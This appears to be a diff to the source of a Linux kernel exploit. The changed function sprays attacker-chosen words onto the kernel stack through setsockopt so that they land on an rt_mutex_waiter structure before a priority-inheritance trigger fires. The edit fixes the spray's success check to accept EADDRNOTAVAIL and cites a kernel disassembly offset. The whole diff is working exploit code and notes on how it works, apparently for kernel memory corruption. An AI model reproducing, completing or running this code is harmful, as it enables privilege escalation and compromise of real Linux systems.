@@ -469,9 +469,10 @@ void slide_setsockopt_stack_copy(void) {
    * rt_mutex_waiter sits at T-0x4b8 = buffer + SLIDE_SETSO_SPRAY_WAITER_OFF,
    * so the same words the pselect route would plant land exactly on it.  The
    * handler then fails validation (buffer[0x20] != 2, we leave it zeroed) and
-   * returns -EINVAL; the planted words persist on the popped stack.  We only
-   * arm the consumer trigger after observing the EINVAL, so a policy-denied
-   * spray (EACCES/EPERM) never lets the PI walk hit garbage.
+   * returns -EADDRNOTAVAIL (-99, verified in the kernel disassembly at
+   * ip_setsockopt+0x910); the planted words persist on the popped stack.  We
+   * only arm the consumer trigger after observing that errno, so a
+   * policy-denied spray (EACCES/EPERM) never lets the PI walk hit garbage.
    */
   slide_build_waiter_words();
   unsigned char buf[SLIDE_SETSO_SPRAY_COPY_LEN];
@@ -511,7 +512,13 @@ void slide_setsockopt_stack_copy(void) {
                          SLIDE_SETSO_SPRAY_OPTNAME, buf,
                          SLIDE_SETSO_SPRAY_COPY_LEN);
   int saved_errno = errno;
-  if (ret != -1 || saved_errno != EINVAL) {
+  /*
+   * The 0x108-byte copy runs before validation, then the handler checks
+   * buffer[0x20] == 2 (and buffer[0xa0] == 2) and returns -EADDRNOTAVAIL on
+   * mismatch - which is exactly what we want: words planted, option rejected.
+   * Treat EADDRNOTAVAIL (and EINVAL for older kernels) as "copy accepted".
+   */
+  if (ret != -1 || (saved_errno != EADDRNOTAVAIL && saved_errno != EINVAL)) {
     pr_error("slide setsockopt spray not accepted ret=%d errno=%d; "
              "trigger skipped\n",
              ret, saved_errno);
